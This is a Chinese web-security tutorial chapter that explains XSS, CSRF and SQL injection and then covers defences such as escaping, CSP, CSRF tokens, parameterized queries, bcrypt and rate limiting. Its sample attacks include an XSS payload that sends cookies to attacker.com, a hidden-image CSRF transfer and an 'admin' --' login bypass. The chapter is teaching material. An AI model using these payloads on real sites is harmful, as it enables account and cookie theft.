@@ -1,0 +1,411 @@
+---
+title: "安全防护实战"
+chapter: "17"
+description: "学习常见 Web 安全漏洞（XSS、CSRF、SQL 注入），掌握防护措施和最佳实践"
+---
+
+# 安全防护实战
+
+> 安全不是功能，而是底线。
+
+## 常见 Web 安全漏洞
+
+### OWASP Top 10 (2021)
+
+1. **Broken Access Control** - 访问控制缺陷
+2. **Cryptographic Failures** - 密码学失效
+3. **Injection** - 注入攻击
+4. **Insecure Design** - 不安全设计
+5. **Security Misconfiguration** - 安全配置错误
+6. **Vulnerable Components** - 易受攻击的组件
+7. **Identity/Authentication Failures** - 身份/认证失效
+8. **Software/Data Integrity Failures** - 软件/数据完整性失效
+9. **Security Logging/Monitoring Failures** - 安全日志/监控失效
+10. **Server-Side Request Forgery (SSRF)** - 服务端请求伪造
+
+## XSS（跨站脚本攻击）
+
+### 什么是 XSS？
+
+攻击者向网页注入恶意脚本，当其他用户访问时，脚本在他们的浏览器中执行。
+
+### XSS 类型
+
+| 类型 | 说明 | 危害 |
+|------|------|------|
+| 存储型 XSS | 恶意脚本存储在服务器（如评论区） | 所有访问页面的用户都会中招 |
+| 反射型 XSS | 恶意脚本通过 URL 传递 | 诱骗用户点击恶意链接 |
+| DOM 型 XSS | 客户端 JS 不安全地处理 DOM | 绕过服务器过滤 |
+
+### XSS 攻击示例
+
+```html
+<!-- ❌ 危险：未过滤的用户输入 -->
+<!-- 假设这是一个评论功能 -->
+<div id="comments"></div>
+
+<script>
+// 从 URL 获取参数（模拟用户输入）
+const comment = new URLSearchParams(window.location.search).get('comment')
+document.getElementById('comments').innerHTML = comment
+</script>
+
+<!-- 攻击者可以构造这样的 URL： -->
+<!-- http://example.com/?comment=<script>alert('XSS')</script> -->
+<!-- 或者更危险的： -->
+<!-- ?comment=<script>fetch('http://attacker.com?cookie='+document.cookie)</script> -->
+```
+
+### XSS 防护
+
+```javascript
+// ✅ 方法 1：HTML 转义
+function escapeHtml(text) {
+  const map = {
+    '&': '&amp;',
+    '<': '&lt;',
+    '>': '&gt;',
+    '"': '&quot;',
+    "'": '&#39;'
+  }
+  return text.replace(/[&<>"']/g, m => map[m])
+}
+
+// 使用
+const safeComment = escapeHtml(userInput)
+document.getElementById('comments').innerHTML = safeComment
+
+// ✅ 方法 2：使用 textContent（推荐）
+const div = document.getElementById('comments')
+div.textContent = userInput // 自动转义
+
+// ✅ 方法 3：使用 CSP（Content Security Policy）
+// HTTP 响应头：
+// Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'
+```
+
+```javascript
+// ✅ 方法 4：使用 Helmet（Node.js/Express）
+const helmet = require('helmet')
+const app = express()
+
+app.use(helmet()) // 自动设置安全相关的 HTTP 头
+
+// 自定义 CSP
+app.use(helmet.contentSecurityPolicy({
+  directives: {
+    defaultSrc: ["'self'"],
+    scriptSrc: ["'self'", "'nonce-abc123'"],
+    styleSrc: ["'self'", "'unsafe-inline'"],
+    imgSrc: ["'self'", "data:", "https:"],
+    connectSrc: ["'self'"]
+  }
+}))
+```
+
+## CSRF（跨站请求伪造）
+
+### 什么是 CSRF？
+
+攻击者诱骗用户点击恶意链接，在用户不知情的情况下以用户的身份发送请求。
+
+### CSRF 攻击示例
+
+```html
+<!-- ❌ 危险：假设用户已登录银行网站 -->
+
+<!-- 攻击者的恶意网站 -->
+<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none" />
+
+<!-- 当用户访问攻击者的网站时，浏览器会自动发送 Cookie -->
+<!-- 银行服务器会认为这是用户的合法请求 -->
+```
+
+### CSRF 防护
+
+```javascript
+// ✅ 方法 1：使用 CSRF Token
+const csrf = require('csurf')
+const cookieParser = require('cookie-parser')
+
+app.use(cookieParser())
+app.use(csrf({ cookie: true }))
+
+// 在表单中嵌入 CSRF Token
+app.get('/form', (req, res) => {
+  res.send(`
+    <form action="/transfer" method="POST">
+      <input type="hidden" name="_csrf" value="${req.csrfToken()}">
+      <!-- 其他表单字段 -->
+    </form>
+  `)
+})
+
+// 验证 CSRF Token
+app.post('/transfer', (req, res) => {
+  // 如果 CSRF Token 无效，这里会抛出异常
+  // ...
+})
+```
+
+```javascript
+// ✅ 方法 2：使用 SameSite Cookie
+app.use(session({
+  // ...
+  cookie: {
+    httpOnly: true,
+    secure: true, // HTTPS only
+    sameSite: 'strict' // 禁止第三方上下文发送 Cookie
+  }
+}))
+```
+
+```javascript
+// ✅ 方法 3：验证 Origin/Referer
+app.use((req, res, next) => {
+  const origin = req.get('Origin')
+  const referer = req.get('Referer')
+  
+  // 允许的域名
+  const allowedOrigins = ['https://yourdomain.com']
+  
+  if (origin && !allowedOrigins.includes(origin)) {
+    return res.status(403).json({ message: 'Forbidden' })
+  }
+  
+  next()
+})
+```
+
+## SQL 注入
+
+### 什么是 SQL 注入？
+
+攻击者通过在输入中插入 SQL 代码，操纵数据库执行非预期的操作。
+
+### SQL 注入示例
+
+```javascript
+// ❌ 危险：拼接 SQL
+app.post('/login', (req, res) => {
+  const { username, password } = req.body
+  
+  // 危险！直接拼接用户输入
+  const sql = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
+  
+  db.query(sql, (err, results) => {
+    // ...
+  })
+})
+
+// 攻击者可以输入：
+// username: admin' --
+// password: 任意值
+// 最终 SQL：SELECT * FROM users WHERE username = 'admin' --' AND password = 'xxx'
+// "--" 是 SQL 注释，后面的密码检查被注释掉
+// 攻击者无需密码即可登录！
+```
+
+### SQL 注入防护
+
+```javascript
+// ✅ 方法 1：使用参数化查询（推荐）
+app.post('/login', (req, res) => {
+  const { username, password } = req.body
+  
+  // 使用 ? 作为占位符
+  const sql = 'SELECT * FROM users WHERE username = ? AND password = ?'
+  
+  db.query(sql, [username, password], (err, results) => {
+    // ...
+  })
+})
+
+// ✅ 方法 2：使用 ORM（如 Sequelize）
+const User = require('./models/User')
+
+app.post('/login', async (req, res) => {
+  const { username, password } = req.body
+  
+  const user = await User.findOne({
+    where: {
+      username: username,
+      password: password
+    }
+  })
+  
+  // ...
+})
+```
+
+## 密码安全
+
+### 密码存储
+
+```javascript
+const bcrypt = require('bcryptjs')
+
+// ❌ 危险：明文存储
+const password = '123456' // 永远不要这样做！
+
+// ❌ 危险：MD5/SHA1 哈希（已被破解）
+const hash = md5(password) // 不要使用！
+
+// ✅ 正确：使用 bcrypt
+const salt = await bcrypt.genSalt(10)
+const hashedPassword = await bcrypt.hash(password, salt)
+
+// 验证密码
+const isValid = await bcrypt.compare(password, hashedPassword)
+```
+
+### 密码策略
+
+```javascript
+// 密码强度验证
+function validatePassword(password) {
+  const minLength = 8
+  const hasUpperCase = /[A-Z]/.test(password)
+  const hasLowerCase = /[a-z]/.test(password)
+  const hasNumbers = /\d/.test(password)
+  const hasSpecialChar = /[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]+/.test(password)
+  
+  if (password.length < minLength) {
+    throw new Error('密码长度至少 8 位')
+  }
+  
+  if (!hasUpperCase || !hasLowerCase || !hasNumbers || !hasSpecialChar) {
+    throw new Error('密码必须包含大小写字母、数字和特殊字符')
+  }
+  
+  return true
+}
+```
+
+## HTTPS
+
+### 为什么需要 HTTPS？
+
+| HTTP | HTTPS |
+|------|-------|
+| 明文传输 | 加密传输 |
+| 容易被窃听 | 防止窃听 |
+| 容易被篡改 | 防止篡改 |
+| 容易被中间人攻击 | 验证服务器身份 |
+
+### 使用 Let's Encrypt 免费 HTTPS 证书
+
+```bash
+# 安装 certbot
+sudo apt-get install certbot python3-certbot-nginx
+
+# 获取证书（Nginx）
+sudo certbot --nginx -d example.com -d www.example.com
+
+# 自动续期
+sudo certbot renew --dry-run
+```
+
+```javascript
+// Express + HTTPS
+const https = require('https')
+const fs = require('fs')
+const express = require('express')
+
+const app = express()
+
+const options = {
+  key: fs.readFileSync('/path/to/private-key.pem'),
+  cert: fs.readFileSync('/path/to/certificate.pem')
+}
+
+https.createServer(options, app).listen(443, () => {
+  console.log('HTTPS server running on port 443')
+})
+
+// HTTP 重定向到 HTTPS
+const http = require('http')
+
+http.createServer((req, res) => {
+  res.writeHead(301, { 'Location': 'https://' + req.headers['host'] + req.url })
+  res.end()
+}).listen(80)
+```
+
+## 安全 Headers
+
+### 使用 Helmet 设置安全 Headers
+
+```javascript
+const helmet = require('helmet')
+const app = express()
+
+// 使用默认配置
+app.use(helmet())
+
+// 或自定义配置
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", "'unsafe-inline'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", "data:", "https:"]
+    }
+  },
+  xFrameOptions: { action: 'deny' }, // 防止点击劫持
+  xContentTypeOptions: true, // 防止 MIME 类型嗅探
+  xXssProtection: true, // 启用 XSS 过滤器
+  hsts: {
+    maxAge: 31536000, // 1 年
+    includeSubDomains: true,
+    preload: true
+  } // 强制 HTTPS
+}))
+```
+
+## 速率限制
+
+### 防止暴力破解
+
+```javascript
+const rateLimit = require('express-rate-limit')
+
+// 全局速率限制
+const globalLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 分钟
+  max: 100, // 每个 IP 最多 100 次请求
+  message: '请求过于频繁，请稍后再试'
+})
+
+app.use(globalLimiter)
+
+// 登录接口速率限制（更严格）
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 分钟
+  max: 5, // 最多 5 次尝试
+  message: '登录尝试次数过多，请 15 分钟后再试'
+})
+
+app.post('/login', loginLimiter, (req, res) => {
+  // ...
+})
+```
+
+## 小结
+
+✅ **已完成：**
+- 了解了 OWASP Top 10 安全漏洞
+- 学会了 XSS 攻击防护
+- 掌握了 CSRF 攻击防护
+- 了解了 SQL 注入防护
+- 学会了密码安全存储
+- 掌握了 HTTPS 和安全 Headers 配置
+
+🚀 **下一步：**
+- 学习 WebSocket 实时通信
+- 掌握 GraphQL API 开发
+- 学习 Serverless 无服务器架构
+- 了解监控与日志
+
+💡 **提示：** 安全是一个持续的过程，定期使用 OWASP ZAP 等工具进行安全扫描！
